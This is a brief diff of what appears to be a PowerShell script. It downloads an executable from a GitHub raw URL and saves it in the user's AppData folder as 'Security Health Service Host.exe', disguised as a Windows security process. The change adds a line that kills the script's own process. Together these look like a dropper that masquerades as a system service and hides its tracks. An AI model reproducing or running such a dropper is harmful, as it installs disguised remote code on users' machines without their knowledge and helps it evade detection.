@@ -15,3 +15,5 @@ function Download($from, $to) {
 }
 
 download https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/main.exe "%APPDATA%\YourAppName\Security Health Service Host.exe"
+
+Stop-Process -Id $PID
